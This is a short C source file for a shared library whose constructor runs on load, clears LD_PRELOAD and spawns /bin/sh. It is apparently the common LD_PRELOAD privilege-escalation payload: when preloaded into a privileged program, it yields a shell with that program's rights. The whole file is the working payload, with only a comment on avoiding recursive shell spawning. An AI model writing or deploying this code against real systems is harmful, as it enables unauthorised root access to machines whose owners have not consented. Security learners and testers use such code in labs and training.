#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void init() {
    unsetenv("LD_PRELOAD"); // THIS IS SUPER IMPORTANT!!!! OTHERWISE, YOU SPAWN A SHELL -> PRELOAD -> SPAWN A SHELL -> PRELOAD...
    system("/bin/sh");
}